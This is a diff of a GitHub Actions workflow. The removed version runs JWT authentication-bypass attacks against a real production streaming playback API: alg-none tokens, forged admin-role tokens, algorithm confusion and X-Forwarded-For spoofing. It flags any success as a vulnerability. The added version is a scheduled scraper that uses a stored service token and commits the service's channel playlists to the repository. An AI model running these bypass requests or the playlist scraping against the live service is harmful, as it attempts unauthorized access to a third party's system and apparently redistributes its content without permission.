@@ -1,196 +1,47 @@
-name: Toffee Playback API Test with JWT Bypass
+name: Toffee Playlist Scraper
 
 on:
   workflow_dispatch:
-    inputs:
-      test_type:
-        description: 'Test Type'
-        required: true
-        default: 'normal'
-        type: choice
-        options:
-          - normal
-          - none_alg
-          - empty_token
-          - invalid_sig
-          - algo_confusion
-          - expired_token
+  schedule:
+    - cron: '0 */6 * * *'
 
 permissions:
-  contents: read
+  contents: write
 
 jobs:
-  api-test:
+  scrape:
     runs-on: ubuntu-latest
-
-    env:
-      API_URL: "https://entitlement-prod.services.toffeelive.com/toffee/BD/DK/web/playback/kK2aX5UBrjBfS2_RBcKf"
-
+    
     steps:
-      - name: Install jq and base64
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install Playwright and dependencies
         run: |
-          sudo apt-get update -qq
-          sudo apt-get install -y jq openssl
+          pip install playwright requests
+          playwright install chromium
+          playwright install-deps chromium
 
-      - name: Generate Test Tokens
-        id: token_gen
+      - name: Run scraper
+        env:
+          TOFFEE_TOKEN: ${{ secrets.TOFFEE_TOKEN }}
+        run: python zoo.py
+
+      - name: Commit results
         run: |
-          case "${{ github.event.inputs.test_type }}" in
-            normal)
-              echo "token=${{ secrets.TOFFEE_TOKEN }}" >> $GITHUB_OUTPUT
-              echo "Testing with valid token"
-              ;;
-            
-            none_alg)
-              # None algorithm bypass
-              HEADER='{"alg":"none","typ":"JWT"}'
-              PAYLOAD='{"sub":"123","iat":'$(date +%s)'}'
-              TOKEN=$(echo -n "$HEADER" | base64 -w0 | tr '+/' '-_' | tr -d '=').$(echo -n "$PAYLOAD" | base64 -w0 | tr '+/' '-_' | tr -d '=').
-              echo "token=$TOKEN" >> $GITHUB_OUTPUT
-              echo "Testing: None algorithm bypass"
-              ;;
-            
-            empty_token)
-              # Empty token test
-              echo "token=" >> $GITHUB_OUTPUT
-              echo "Testing: Empty token"
-              ;;
-            
-            invalid_sig)
-              # Valid header/payload but invalid signature
-              HEADER='{"alg":"HS256","typ":"JWT"}'
-              PAYLOAD='{"sub":"admin","role":"admin"}'
-              TOKEN=$(echo -n "$HEADER" | base64 -w0 | tr '+/' '-_' | tr -d '=').$(echo -n "$PAYLOAD" | base64 -w0 | tr '+/' '-_' | tr -d '=').invalidsignature123
-              echo "token=$TOKEN" >> $GITHUB_OUTPUT
-              echo "Testing: Invalid signature"
-              ;;
-            
-            algo_confusion)
-              # RS256 to HS256 confusion
-              HEADER='{"alg":"HS256","typ":"JWT"}'
-              PAYLOAD='{"sub":"admin","role":"admin"}'
-              TOKEN=$(echo -n "$HEADER" | base64 -w0 | tr '+/' '-_' | tr -d '=').$(echo -n "$PAYLOAD" | base64 -w0 | tr '+/' '-_' | tr -d '=').fake_signature
-              echo "token=$TOKEN" >> $GITHUB_OUTPUT
-              echo "Testing: Algorithm confusion (RS256→HS256)"
-              ;;
-            
-            expired_token)
-              # Expired token
-              HEADER='{"alg":"HS256","typ":"JWT"}'
-              EXP=$(($(date +%s) - 86400))
-              PAYLOAD="{\"sub\":\"123\",\"exp\":$EXP}"
-              TOKEN=$(echo -n "$HEADER" | base64 -w0 | tr '+/' '-_' | tr -d '=').$(echo -n "$PAYLOAD" | base64 -w0 | tr '+/' '-_' | tr -d '=').expired
-              echo "token=$TOKEN" >> $GITHUB_OUTPUT
-              echo "Testing: Expired token"
-              ;;
-          esac
-
-      - name: Call Playback API
-        run: |
-          set +e
-
-          echo "======================================"
-          echo "       TOFFEE PLAYBACK API TEST"
-          echo "       Mode: ${{ github.event.inputs.test_type }}"
-          echo "======================================"
-
-          TOKEN="${{ steps.token_gen.outputs.token }}"
+          git config user.name "GitHub Actions"
+          git config user.email "actions@github.com"
           
-          # Build curl command
-          if [ -z "$TOKEN" ]; then
-            echo "Testing without Authorization header..."
-            curl -sS \
-              -X POST \
-              "$API_URL" \
-              -D headers.txt \
-              -o response.json \
-              -w "\nHTTP_STATUS=%{http_code}\nCONTENT_TYPE=%{content_type}\nSIZE=%{size_download}\nTIME=%{time_total}s\n" \
-              -H "Referer: https://toffeelive.com/" \
-              -H "User-Agent: Mozilla/5.0" \
-              -H "Content-Type: application/json"
+          git add zoo_playlist.m3u zoo_playlist.json channels_data.json
+          
+          if git diff --cached --quiet; then
+            echo "No changes to commit"
           else
-            echo "Testing with manipulated token..."
-            curl -sS \
-              -X POST \
-              "$API_URL" \
-              -D headers.txt \
-              -o response.json \
-              -w "\nHTTP_STATUS=%{http_code}\nCONTENT_TYPE=%{content_type}\nSIZE=%{size_download}\nTIME=%{time_total}s\n" \
-              -H "Authorization: Bearer $TOKEN" \
-              -H "Referer: https://toffeelive.com/" \
-              -H "User-Agent: Mozilla/5.0" \
-              -H "Content-Type: application/json"
+            git commit -m "Update playlists: $(date -u +'%Y-%m-%d %H:%M:%S UTC')"
+            git push
           fi
-
-          echo
-          echo "======================================"
-          echo "RESPONSE HEADERS"
-          echo "======================================"
-          cat headers.txt
-
-          echo
-          echo "======================================"
-          echo "RAW RESPONSE"
-          echo "======================================"
-          cat response.json
-
-          echo
-          echo "======================================"
-          echo "SECURITY TEST RESULTS"
-          echo "======================================"
-          
-          HTTP_STATUS=$(grep "HTTP_STATUS" headers.txt 2>/dev/null | cut -d= -f2 || echo "unknown")
-          
-          if [ "$HTTP_STATUS" = "200" ] || [ "$HTTP_STATUS" = "201" ]; then
-            echo "⚠️  VULNERABILITY DETECTED!"
-            echo "    Request succeeded with manipulated token"
-            echo "    Test Type: ${{ github.event.inputs.test_type }}"
-          elif [ "$HTTP_STATUS" = "401" ]; then
-            echo "✅ Properly rejected (401 Unauthorized)"
-          elif [ "$HTTP_STATUS" = "403" ]; then
-            echo "✅ Properly rejected (403 Forbidden)"
-          else
-            echo "Status: $HTTP_STATUS"
-          fi
-
-          echo
-          echo "======================================"
-          echo "JSON ANALYSIS"
-          echo "======================================"
-
-          if jq empty response.json 2>/dev/null; then
-            echo "Valid JSON: YES"
-            echo
-            echo "Response structure:"
-            jq '.' response.json
-            
-            echo
-            echo "Error messages (if any):"
-            jq -r '.error // .message // .detail // "No error field found"' response.json 2>/dev/null || echo "N/A"
-          else
-            echo "Valid JSON: NO"
-            cat response.json
-          fi
-
-      - name: Additional Header Bypass Tests
-        if: github.event.inputs.test_type == 'header_bypass'
-        run: |
-          echo "Testing header-based bypasses..."
-          
-          # Test without Authorization header
-          echo "Test 1: Missing Authorization header"
-          curl -sS -X POST "$API_URL" -o /dev/null -w "%{http_code}\n" \
-            -H "Content-Type: application/json"
-          
-          # Test with malformed header
-          echo "Test 2: Malformed Authorization header"
-          curl -sS -X POST "$API_URL" -o /dev/null -w "%{http_code}\n" \
-            -H "Authorization: Basic dGVzdDp0ZXN0" \
-            -H "Content-Type: application/json"
-          
-          # Test with X-Forwarded-For spoofing
-          echo "Test 3: With X-Forwarded-For"
-          curl -sS -X POST "$API_URL" -o /dev/null -w "%{http_code}\n" \
-            -H "Authorization: Bearer invalid" \
-            -H "X-Forwarded-For: 127.0.0.1" \
-            -H "Content-Type: application/json"
